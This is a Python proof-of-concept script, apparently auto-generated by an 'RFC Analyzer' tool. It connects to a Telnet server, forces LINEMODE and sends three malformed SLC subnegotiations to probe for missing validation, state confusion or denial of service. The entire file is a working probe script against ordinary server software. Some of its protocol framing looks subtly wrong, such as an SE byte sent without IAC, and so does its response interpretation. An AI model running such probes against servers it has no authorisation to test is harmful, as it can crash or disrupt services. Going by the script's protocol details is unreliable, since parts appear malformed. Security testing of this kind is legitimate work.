# Generated by RFC Analyzer from protocol specification analysis.

#!/usr/bin/env python3
"""
PoC for MissingValidationOfSLCValues in Telnet LINEMODE.
This script sends malformed SLC (Special Character List) subnegotiations
to a Telnet server to test if it validates character codes and levels.
"""
import socket
import sys

# Telnet Protocol Constants
IAC = b'\xff'
SB  = b'\xfa'  # Subnegotiation Begin
SE  = b'\xf0'  # Subnegotiation End
WILL= b'\xfb'
WONT= b'\xfc'
DO  = b'\xfd'
DONT= b'\xfe'

# LINEMODE Option Code (RFC 1184)
LINEMODE_OPT = 34

# SLC Command Code within LINEMODE (RFC 1184 Section 5.2)
SLC_CMD = 1

def send_raw(sock, data):
    """Send raw bytes to the socket."""
    sock.sendall(data)

def receive_until_se(sock, timeout=2):
    """Receive data until Subnegotiation End (SE) is found or timeout occurs."""
    buffer = b''
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            buffer += chunk
            if SE in buffer:
                break
    except socket.timeout:
        pass
    return buffer

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    # Step 1: Establish TCP connection to the Telnet server
    print(f"[*] Connecting to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target_ip, target_port))
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    # Step 2: Negotiate LINEMODE option (WILL LINEMODE / DO LINEMODE)
    # Note: In a real scenario, the server might initiate or respond to negotiation.
    # Here we attempt to force LINEMODE on.
    print("[*] Attempting to negotiate LINEMODE...")
    send_raw(sock, IAC + WILL + bytes([LINEMODE_OPT]))
    send_raw(sock, IAC + DO + bytes([LINEMODE_OPT]))
    
    # Wait for negotiation response
    resp = receive_until_se(sock)
    print(f"[*] Negotiation response: {resp.hex()}")

    # Step 3: Craft malformed SLC subnegotiations
    # According to RFC 1184, SLC contains:
    # - Character Code (usually 0-255)
    # - Level/Flags (bits indicating action)
    
    # Malformed Payload 1: Invalid character code (e.g., 0xFF which is IAC, causing parsing confusion)
    print("[*] Sending malformed SLC with invalid char code (0xFF)...")
    slc_payload_1 = bytes([SLC_CMD, 0xFF, 0x00]) # Cmd, CharCode(IAC), Level
    sb_data_1 = IAC + SB + bytes([LINEMODE_OPT]) + slc_payload_1 + SE
    send_raw(sock, sb_data_1)
    resp1 = receive_until_se(sock)
    print(f"[*] Response 1: {resp1.hex()}")

    # Malformed Payload 2: Invalid level bits (e.g., reserved or out-of-range flags)
    print("[*] Sending malformed SLC with invalid level bits...")
    slc_payload_2 = bytes([SLC_CMD, ord('x'), 0xFF]) # Cmd, CharCode('x'), Level(Invalid)
    sb_data_2 = IAC + SB + bytes([LINEMODE_OPT]) + slc_payload_2 + SE
    send_raw(sock, sb_data_2)
    resp2 = receive_until_se(sock)
    print(f"[*] Response 2: {resp2.hex()}")

    # Malformed Payload 3: SLC_DEFAULT with arbitrary value (RFC 1184 Section 5.9)
    # The server should reject or respond appropriately if validation is missing.
    print("[*] Sending SLC_DEFAULT with arbitrary value...")
    slc_payload_3 = bytes([SLC_CMD, 0x00, 0xFF]) # Cmd, CharCode(0), Level(Default)
    sb_data_3 = IAC + SB + bytes([LINEMODE_OPT]) + slc_payload_3 + SE
    send_raw(sock, sb_data_3)
    resp3 = receive_until_se(sock)
    print(f"[*] Response 3: {resp3.hex()}")

    # Step 4: Observe outcome
    print("\n[+] Analysis:")
    if b'\xfd' in resp1 or b'\xfe' in resp1: # DO/DONT response indicates rejection/negotiation failure
        print("[*] Target responded with negotiation commands, indicating it processed the malformed input.")
    else:
        print("[!] No specific rejection observed. Check for state confusion or DoS.")

    sock.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    main()